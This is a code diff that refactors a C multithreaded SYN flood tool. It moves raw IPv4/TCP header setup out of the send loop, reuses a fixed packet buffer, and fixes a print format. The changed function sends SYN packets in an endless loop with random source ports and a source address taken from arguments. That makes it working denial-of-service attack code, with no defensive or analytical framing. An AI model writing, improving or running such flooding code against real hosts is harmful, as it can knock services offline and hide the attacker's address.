@@ -36,9 +36,21 @@ void SynFloodPrintUsage(void)
 void *GenerateSynFlood(void *data)
 {
     srand(time(NULL));
-    int thread_id = *((int*) data);
     int sock = MakeRawSocket(IPPROTO_TCP);
     MaskingArguments syn_now = g_syn_now;
+
+    struct iphdr ipv4_h;
+    struct tcphdr tcp_h;
+
+    PrepareEmptyIphdr(&ipv4_h);
+
+    IphdrSetProtocol(&ipv4_h, IPPROTO_TCP);
+    IphdrAddSize(&ipv4_h, sizeof(struct tcphdr));
+
+    PrepareEmptyTcphdr(&tcp_h);
+    TcphdrSetSynFlag(&tcp_h);
+
+    char packet[BUFFER_SIZE];
 
     while (1) {
         // *** begin of critical section ***
@@ -58,26 +70,21 @@ void *GenerateSynFlood(void *data)
         pthread_mutex_unlock(&g_syn_mutex);
 
         // make ipv4 header
-        struct iphdr ipv4_h;
-        ipv4_h = PrepareEmptyIphdr();
-        ipv4_h = IphdrSetProtocol(ipv4_h, IPPROTO_TCP);
-        ipv4_h = IphdrSetSrcAddr(ipv4_h, inet_addr(syn_now.src));
-        ipv4_h = IphdrSetDestAddr(ipv4_h, inet_addr(syn_now.dest));
-        ipv4_h = IphdrAddSize(ipv4_h, sizeof(struct tcphdr));
+        ipv4_h.saddr = inet_addr(syn_now.src);
+        ipv4_h.daddr = inet_addr(syn_now.dest);
+        
         // make tcp header.
-        struct tcphdr tcp_h;
-        tcp_h = PrepareEmptyTcphdr();
         
         // set src port number random
-        tcp_h = TcphdrSetSrcPort(tcp_h, rand() % 65535 + 1);
-        tcp_h = TcphdrSetDestPort(tcp_h, syn_now.port);
-        tcp_h = TcphdrSetSeq(tcp_h, g_syn_num_total);
-        tcp_h = TcphdrSetSynFlag(tcp_h);
-        tcp_h = TcphdrGetChecksum(ipv4_h, tcp_h, NULL, 0);
+        tcp_h.source = htons(rand() % 65535 + 1);
+        tcp_h.dest = htons(syn_now.port);
+        tcp_h.seq = htonl(g_syn_num_total);
+        
+        TcphdrGetChecksum(&ipv4_h, &tcp_h, NULL, 0);
 
-        char *packet = AssembleIphdrWithData(ipv4_h, &tcp_h, sizeof(tcp_h));
-        SendPacket(sock, ipv4_h, packet, syn_now.port);
-        free(packet);
+        memset(packet, 0x00, sizeof(packet));
+        AssembleIphdrWithData(packet, &ipv4_h, &tcp_h, sizeof(tcp_h));
+        SendPacket(sock, packet, ipv4_h.daddr, ipv4_h.tot_len, syn_now.port);
     }
     close(sock);
     return 0;
@@ -137,7 +144,7 @@ void SynFloodMain(char *argv[])
         printf("thread %d joined\n", i);
     }
     pthread_mutex_destroy(&g_syn_mutex);
-    printf("SYN Flooding finished\nTotal %lu packets sent.\n",
+    printf("SYN Flooding finished\nTotal %u packets sent.\n",
             g_syn_num_total);
     pthread_exit(NULL);
     return;
